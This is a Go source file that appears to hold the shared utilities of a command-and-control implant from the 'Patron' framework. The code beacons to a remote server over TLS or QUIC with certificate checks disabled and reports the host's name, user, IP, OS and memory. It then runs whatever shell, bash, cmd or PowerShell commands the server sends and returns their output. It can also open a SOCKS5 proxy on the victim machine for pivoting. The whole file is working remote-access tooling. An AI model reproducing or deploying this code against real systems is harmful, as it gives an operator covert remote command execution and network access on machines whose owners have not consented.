package client_utils

// collection of utilities used by all agents

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	fqdn "github.com/Showmax/go-fqdn"
	"github.com/armon/go-socks5"
	"github.com/quic-go/quic-go"
	"github.com/shirou/gopsutil/v4/host"
	"github.com/shirou/gopsutil/v4/mem"

	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
	"github.com/PatronC2/Patron/lib/common"
	"github.com/PatronC2/Patron/lib/logger"
)

type Config struct {
	ServerIP          *string
	ServerPort        *string
	CallbackFrequency *string
	CallbackJitter    *string
	TransportProtocol *string
}

var ClientConfig = &Config{
	ServerIP:          new(string),
	ServerPort:        new(string),
	CallbackFrequency: new(string),
	CallbackJitter:    new(string),
	TransportProtocol: new(string),
}

type ProxyServer struct {
	server   *socks5.Server
	listener net.Listener
	cancel   context.CancelFunc
	wg       sync.WaitGroup
}

var activeProxy *ProxyServer

func Initialize(logging_enabled string) {
	set_logging, err := strconv.ParseBool(logging_enabled)
	if err != nil {
		fmt.Printf("Failed to parse LoggingEnabled: %v\n", err)
	}
	logger.EnableLogging(set_logging)
	if set_logging {
		if err := logger.SetLogFile("app.log"); err != nil {
			fmt.Printf("Error setting log file: %v\n", err)
		}
	}
}

func LoadCertificate(RootCert, transport string) (*tls.Config, error) {
	publicKey, err := base64.StdEncoding.DecodeString(RootCert)
	if err != nil {
		return nil, err
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(publicKey) {
		return nil, fmt.Errorf("failed to parse root certificate")
	}
	config := &tls.Config{
		RootCAs:            roots,
		InsecureSkipVerify: true,
	}
	if transport == "QUIC" {
		config.NextProtos = []string{"quic-patron"}
	}

	return config, nil
}

func GenerateAgentMetadata() (string, string) {
	var hostname string
	var username string

	hostname, err := getHostname()
	if err != nil {
		logger.Logf(logger.Error, "Error generating agent metadata: %v", err)
	}

	username, err = getUsername()
	if err != nil {
		logger.Logf(logger.Error, "Error generating agent metadata: %v", err)
	}

	return hostname, username
}

func GetExecutablePath() string {
	path, err := os.Executable()
	if err != nil {
		logger.Logf(logger.Error, "Error fetching executable path: %v", err)
		return "unknown"
	}
	return path
}

func getHostname() (string, error) {
	hostname, err := fqdn.FqdnHostname()
	if err != nil {
		logger.Logf(logger.Error, "Error fetching hostname: %v", err)
		return "unknown", err
	}
	return hostname, nil
}

func getUsername() (string, error) {
	user, err := user.Current()
	username := user.Username
	if err != nil {
		logger.Logf(logger.Error, "Error fetching username: %v", err)
		return "unknown", err
	}
	return username, nil
}

func RunShellCommand(command string) string {
	return RunTypedCommand("shell", command)
}

func RunTypedCommand(commandType string, command string) string {
	var cmd *exec.Cmd
	switch commandType {
	case "powershell":
		cmd = exec.Command("powershell", "-Command", command)
	case "cmd":
		cmd = exec.Command("cmd", "/C", command)
	case "sh":
		cmd = exec.Command("sh", "-c", command)
	case "bash":
		cmd = exec.Command("bash", "-c", command)
	case "shell":
		if runtime.GOOS == "windows" {
			cmd = exec.Command("powershell", "-Command", command)
		} else {
			cmd = exec.Command("bash", "-c", command)
		}
	default:
		return fmt.Sprintf("Unsupported command type: %s", commandType)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		logger.Logf(logger.Error, "Error running command: %v", command)
		return err.Error()
	}
	logger.Logf(logger.Done, "Ran command: %v", command)
	return string(output)
}

type quicBeacon struct {
	quic.Stream
	conn quic.Connection
}

func (b *quicBeacon) LocalAddr() net.Addr {
	return b.conn.LocalAddr()
}

func (b *quicBeacon) Close() error {
	_ = b.Stream.Close()
	return b.conn.CloseWithError(0, "")
}

func EstablishConnection(config *tls.Config, ServerIP, ServerPort, TransportProtocol string) (io.ReadWriteCloser, error) {
	ip := net.ParseIP(ServerIP)
	var address string
	if ip != nil && ip.To4() == nil {
		address = fmt.Sprintf("[%s]:%s", ServerIP, ServerPort)
	} else {
		address = fmt.Sprintf("%s:%s", ServerIP, ServerPort)
	}

	switch TransportProtocol {
	case "QUIC":
		logger.Logf(logger.Info, "Dialing QUIC %v", address)
		session, err := quic.DialAddr(context.Background(), address, config, nil)
		if err != nil {
			return nil, fmt.Errorf("QUIC dial failed: %w", err)
		}
		stream, err := session.OpenStreamSync(context.Background())
		if err != nil {
			return nil, fmt.Errorf("QUIC stream failed: %w", err)
		}
		return &quicBeacon{Stream: stream, conn: session}, nil

	case "TCP":
		logger.Logf(logger.Info, "Dialing TCP %v", address)
		conn, err := tls.Dial("tcp", address, config)
		if err != nil {
			return nil, fmt.Errorf("TCP dial failed: %w", err)
		}
		return conn, nil

	default:
		return nil, fmt.Errorf("unsupported transport: %s", TransportProtocol)
	}
}

func GetLocalIP(beacon io.ReadWriteCloser, serverIP, serverPort, transportProtocol string) string {
	type localAddresser interface {
		LocalAddr() net.Addr
	}

	if la, ok := beacon.(localAddresser); ok {
		if ip := ipFromAddr(la.LocalAddr()); ip != "" {
			return ip
		}
	}

	return detectOutboundIP(serverIP, serverPort, transportProtocol)
}

func ipFromAddr(addr net.Addr) string {
	if addr == nil {
		return ""
	}

	switch a := addr.(type) {
	case *net.TCPAddr:
		return normalizeIP(a.IP)
	case *net.UDPAddr:
		return normalizeIP(a.IP)
	case *net.IPAddr:
		return normalizeIP(a.IP)
	default:
		host, _, err := net.SplitHostPort(addr.String())
		if err == nil && host != "" {
			return host
		}
	}
	return ""
}

func normalizeIP(ip net.IP) string {
	if ip == nil {
		return ""
	}

	if ip.IsUnspecified() {
		return ""
	}

	if v4 := ip.To4(); v4 != nil {
		return v4.String()
	}
	return ip.String()
}

func detectOutboundIP(serverIP, serverPort, transportProtocol string) string {
	target := net.JoinHostPort(serverIP, serverPort)
	ip := net.ParseIP(serverIP)

	var network string

	switch strings.ToUpper(transportProtocol) {
	case "TCP":
		if ip != nil {
			if ip.To4() != nil {
				network = "tcp4"
			} else {
				network = "tcp6"
			}
		} else {
			network = "tcp"
		}
	case "QUIC":
		if ip != nil {
			if ip.To4() != nil {
				network = "udp4"
			} else {
				network = "udp6"
			}
		} else {
			network = "udp"
		}
	default:
		if ip != nil {
			if ip.To4() != nil {
				network = "tcp4"
			} else {
				network = "tcp6"
			}
		} else {
			network = "tcp"
		}
	}

	conn, err := net.Dial(network, target)
	if err != nil {
		return "unknown"
	}
	defer conn.Close()

	return ipFromAddr(conn.LocalAddr())
}

func HandleError(beacon io.ReadWriteCloser, reqType string, err error) {
	logger.Logf(logger.Error, "Error during %s request: %v", reqType, err)
	beacon.Close()
	time.Sleep(2 * time.Second)
}

func GetOSInfo() (string, string, string, string, string) {
	osType := runtime.GOOS
	osArch := runtime.GOARCH
	cpus := strconv.Itoa(runtime.NumCPU())

	memory, err := getMemoryGB()
	if err != nil {
		memory = "Unknown"
	}

	osVersion, err := getOSVersion()
	if err != nil {
		osVersion = "Unknown OS Version"
	}

	return osType, osArch, osVersion, cpus, memory
}

func getMemoryGB() (string, error) {
	vm, err := mem.VirtualMemory()
	if err != nil {
		return "", err
	}
	gb := float64(vm.Total) / 1024 / 1024 / 1024
	return fmt.Sprintf("%.1f", gb), nil
}

func getOSVersion() (string, error) {
	info, err := host.Info()
	if err != nil {
		return "", err
	}
	platform := strings.TrimSpace(info.Platform)
	version := strings.TrimSpace(info.PlatformVersion)
	kernel := strings.TrimSpace(info.KernelVersion)
	switch {
	case platform != "" && version != "" && kernel != "":
		return fmt.Sprintf("%s %s (%s)", platform, version, kernel), nil
	case platform != "" && version != "":
		return fmt.Sprintf("%s %s", platform, version), nil
	case kernel != "":
		return kernel, nil
	default:
		return "Unknown OS Version", nil
	}
}

func GetActiveProxy() *ProxyServer {
	return activeProxy
}

func ClearActiveProxy() {
	activeProxy = nil
}

func SetActiveProxy(proxy *ProxyServer) {
	activeProxy = proxy
}

func HandleSocksCommand(beacon io.ReadWriteCloser, cmd *patronobuf.CommandResponse) error {
	if cmd.GetCommand() == "disable" {
		if GetActiveProxy() != nil {
			logger.Logf(logger.Info, "Disabling SOCKS5 proxy")
			GetActiveProxy().StopProxy()
			ClearActiveProxy()
			logger.Logf(logger.Done, "SOCKS5 proxy disabled")
		} else {
			logger.Logf(logger.Info, "No active SOCKS5 proxy to disable")
		}

		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    "Stopped SOCKS5 Proxy",
		}
		return common.WriteDelimited(beacon, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	// Check if already running
	if GetActiveProxy() != nil {
		logger.Logf(logger.Warning, "A SOCKS5 proxy is already running. Cannot start a new one.")
		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    "A SOCKS5 proxy is already running. Stop it before starting a new one.",
		}
		return common.WriteDelimited(beacon, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	portStr := cmd.GetCommand()
	port, err := strconv.Atoi(portStr)
	if err != nil || port < 1 || port > 65535 {
		logger.Logf(logger.Error, "Invalid port number: %s", portStr)
		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    fmt.Sprintf("Invalid port number: %s. Port must be between 1 and 65535.", portStr),
		}
		return common.WriteDelimited(beacon, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	logger.Logf(logger.Debug, "Starting SOCKS5 proxy on port %d", port)
	conf := &socks5.Config{}
	server, err := socks5.New(conf)
	if err != nil {
		logger.Logf(logger.Warning, "Failed to create SOCKS5 server: %v", err)
		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    fmt.Sprintf("Failed to create SOCKS5 proxy: %v", err),
		}
		return common.WriteDelimited(beacon, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		logger.Logf(logger.Warning, "Failed to start listener on port %d: %v", port, err)
		status := &patronobuf.CommandStatusRequest{
			Uuid:      cmd.GetUuid(),
			Commandid: cmd.GetCommandid(),
			Result:    "1",
			Output:    fmt.Sprintf("Failed to start listener on port: %d: %v", port, err),
		}
		return common.WriteDelimited(beacon, &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		})
	}

	ctx, cancel := context.WithCancel(context.Background())
	proxy := &ProxyServer{
		server:   server,
		listener: listener,
		cancel:   cancel,
	}

	proxy.wg.Add(1)
	go func() {
		defer proxy.wg.Done()
		logger.Logf(logger.Info, "SOCKS5 proxy server started on port %d", port)
		if err := server.Serve(listener); err != nil && ctx.Err() == nil {
			logger.Logf(logger.Error, "Error while running SOCKS5 proxy server: %v", err)
		}
	}()

	SetActiveProxy(proxy)
	logger.Logf(logger.Done, "Started SOCKS5 proxy")

	status := &patronobuf.CommandStatusRequest{
		Uuid:      cmd.GetUuid(),
		Commandid: cmd.GetCommandid(),
		Result:    "1",
		Output:    "Started SOCKS5 Proxy",
	}
	return common.WriteDelimited(beacon, &patronobuf.Request{
		Type: patronobuf.RequestType_COMMAND_STATUS,
		Payload: &patronobuf.Request_CommandStatus{
			CommandStatus: status,
		},
	})
}

func (p *ProxyServer) StopProxy() {
	logger.Logf(logger.Info, "Stopping SOCKS5 proxy server...")
	p.cancel()
	p.listener.Close()
	p.wg.Wait()
	logger.Logf(logger.Info, "SOCKS5 proxy server stopped.")
}

func HandleStartupRequest(beacon io.ReadWriteCloser, filepath, hostname, username, ip, osType, osArch, osVersion, cpus, memory string, capabilities []string) (string, error) {
	req := &patronobuf.Request{
		Type: patronobuf.RequestType_STARTUP,
		Payload: &patronobuf.Request_Startup{
			Startup: &patronobuf.StartupRequest{
				Filepath:     filepath,
				Username:     username,
				Hostname:     hostname,
				Ostype:       osType,
				Arch:         osArch,
				Osbuild:      osVersion,
				Cpus:         cpus,
				Memory:       memory,
				Agentip:      ip,
				Capabilities: capabilities,
			},
		},
	}

	if err := common.WriteDelimited(beacon, req); err != nil {
		return "", err
	}

	resp := &patronobuf.Response{}
	if err := common.ReadDelimited(beacon, resp); err != nil {
		return "", err
	}

	if resp.Type != patronobuf.ResponseType_STARTUP_RESPONSE {
		return "", fmt.Errorf("unexpected response type: %v", resp.Type)
	}

	startup := resp.GetStartupResponse()
	if startup == nil || startup.GetUuid() == "" {
		return "", fmt.Errorf("missing startup response UUID")
	}

	return startup.GetUuid(), nil
}

func HandleConfigurationRequest(beacon io.ReadWriteCloser, agentID, serverIP, serverPort, callbackFrequency, callbackJitter string, transportProtocol string) (time.Duration, error) {
	req := &patronobuf.Request{
		Type: patronobuf.RequestType_CONFIGURATION,
		Payload: &patronobuf.Request_Configuration{
			Configuration: &patronobuf.ConfigurationRequest{
				Uuid:              agentID,
				Serverip:          serverIP,
				Serverport:        serverPort,
				Callbackfrequency: callbackFrequency,
				Callbackjitter:    callbackJitter,
				Masterkey:         "MASTERKEY",
				Transportprotocol: transportProtocol,
			},
		},
	}

	if err := common.WriteDelimited(beacon, req); err != nil {
		return 0, err
	}

	resp := &patronobuf.Response{}
	if err := common.ReadDelimited(beacon, resp); err != nil {
		return 0, err
	}

	if resp.Type != patronobuf.ResponseType_CONFIGURATION_RESPONSE {
		return 0, fmt.Errorf("unexpected response type: %v", resp.Type)
	}

	conf := resp.GetConfigurationResponse()
	if conf == nil {
		return 0, fmt.Errorf("missing configuration response payload")
	}

	if conf.GetServerip() == "" || conf.GetServerport() == "" || conf.GetTransportprotocol() == "" {
		return 0, fmt.Errorf("configuration response has empty required fields: serverip=%q serverport=%q transportprotocol=%q",
			conf.GetServerip(), conf.GetServerport(), conf.GetTransportprotocol())
	}
	if conf.GetSleepSeconds() <= 0 {
		return 0, fmt.Errorf("configuration response has non-positive sleep duration: %d", conf.GetSleepSeconds())
	}

	UpdateClientConfig(conf, serverIP, serverPort, transportProtocol)
	return time.Duration(conf.GetSleepSeconds()) * time.Second, nil
}

func UpdateClientConfig(config *patronobuf.ConfigurationResponse, serverIP, serverPort, transportProtocol string) {
	UpdateConfigField(ClientConfig.ServerIP, config.GetServerip(), "callback IP")
	UpdateConfigField(ClientConfig.ServerPort, config.GetServerport(), "callback port")
	UpdateConfigField(ClientConfig.TransportProtocol, config.GetTransportprotocol(), "transport protocol")
}

func UpdateConfigField(current *string, new, fieldName string) {
	if *current != new {
		logger.Logf(logger.Info, "Updating %s", fieldName)
		*current = new
	}
}

func HandleCommandRequest(beacon io.ReadWriteCloser, agentID string) error {
	logger.Logf(logger.Info, "Fetching commands to run")

	for {
		req := &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND,
			Payload: &patronobuf.Request_Command{
				Command: &patronobuf.CommandRequest{Uuid: agentID},
			},
		}

		if err := common.WriteDelimited(beacon, req); err != nil {
			return fmt.Errorf("send command request: %w", err)
		}

		resp := &patronobuf.Response{}
		if err := common.ReadDelimited(beacon, resp); err != nil {
			return fmt.Errorf("read command response: %w", err)
		}

		cmd := resp.GetCommandResponse()
		if cmd == nil {
			return fmt.Errorf("no command response")
		}

		logger.Logf(logger.Debug, "commandType: %v", cmd.Commandtype)

		if cmd.GetCommandtype() == "socks" {
			if err := HandleSocksCommand(beacon, cmd); err != nil {
				return fmt.Errorf("handle SOCKS5 command: %w", err)
			}
			continue
		}

		status := executeCommandRequest(cmd)

		if status.GetResult() == "2" {
			logger.Logf(logger.Info, "No commands to execute. Exiting command loop.")
			return nil
		}

		statusReq := &patronobuf.Request{
			Type: patronobuf.RequestType_COMMAND_STATUS,
			Payload: &patronobuf.Request_CommandStatus{
				CommandStatus: status,
			},
		}

		if err := common.WriteDelimited(beacon, statusReq); err != nil {
			return fmt.Errorf("send command status: %w", err)
		}

		ack := &patronobuf.Response{}
		if err := common.ReadDelimited(beacon, ack); err != nil {
			return fmt.Errorf("read command ack: %w", err)
		}

		logger.Logf(logger.Info, "Command status sent, ack received")
	}
}

func executeCommandRequest(cmd *patronobuf.CommandResponse) *patronobuf.CommandStatusRequest {
	if cmd.GetCommand() == "" && cmd.GetCommandtype() == "" {
		logger.Logf(logger.Info, "No command to execute.")
		return &patronobuf.CommandStatusRequest{Result: "2"}
	}

	var output, result string
	switch cmd.GetCommandtype() {
	case "shell", "sh", "bash", "powershell", "cmd":
		output = RunTypedCommand(cmd.GetCommandtype(), cmd.GetCommand())
		result = "1"
	case "kill":
		output = "~Killed~"
		result = "1"
	default:
		result = "2"
	}

	return &patronobuf.CommandStatusRequest{
		Uuid:      cmd.GetUuid(),
		Commandid: cmd.GetCommandid(),
		Result:    result,
		Output:    output,
	}
}
